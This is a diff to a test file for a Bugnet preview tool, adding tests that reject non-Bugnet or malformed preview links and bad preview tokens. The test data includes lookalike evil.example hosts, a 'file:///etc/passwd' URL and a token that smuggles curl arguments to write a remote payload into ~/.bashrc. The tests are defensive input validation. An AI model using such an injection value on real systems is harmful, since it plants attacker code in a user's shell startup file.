@@ -167,7 +167,7 @@ describe("bugnet_preview", () => {
         });
         const r = await call(client);
         expect(r.isError).toBe(true);
-        expect(r.text).toBe("preview: the router gave no token.");
+        expect(r.text).toBe("preview: the router gave no usable token.");
     });
 
     it("refuses ports outside 1 to 65535 before calling the router", async () => {
@@ -315,11 +315,31 @@ describe("bugnet_preview", () => {
 });
 
 describe("previewLink", () => {
-    it("keeps an https link and refuses anything else", () => {
-        expect(previewLink(url).host).toBe(host);
-        expect(previewLink(`${host}/`).href).toBe(`https://${host}/`);
-        expect(() => previewLink("http://x.preview.bugnet.sh/")).toThrow(/no usable link/);
-        expect(() => previewLink("")).toThrow(/no usable link/);
-        expect(() => previewLink("https://")).toThrow(/no usable link/);
+    it("keeps an https link under Bugnet's domain and refuses anything else", () => {
+        const deps = testDeps();
+        expect(previewLink(deps, url).host).toBe(host);
+        expect(previewLink(deps, `${host}/`).href).toBe(`https://${host}/`);
+        for (const bad of [
+            "http://x.preview.bugnet.sh/",
+            "",
+            "https://",
+            "https://x.preview.evil.example/",
+            "https://bugnet.sh.evil.example/",
+            "https://user:pw@x.preview.bugnet.sh/",
+            "file:///etc/passwd",
+        ]) {
+            expect(() => previewLink(deps, bad)).toThrow(/no usable link/);
+        }
+    });
+
+    it("refuses a token that is not a preview token, since it goes into a curl command", async () => {
+        for (const bad of ["bnp_x' -o ~/.bashrc 'https://evil.example/payload", "", "bnp_short"]) {
+            const client = await connect({
+                createPreview: () => ({ url, token: bad, expiresAt: deadline, listening: true }),
+            });
+            const r = await call(client);
+            expect(r.isError).toBe(true);
+            expect(r.text).toBe("preview: the router gave no usable token.");
+        }
     });
 });
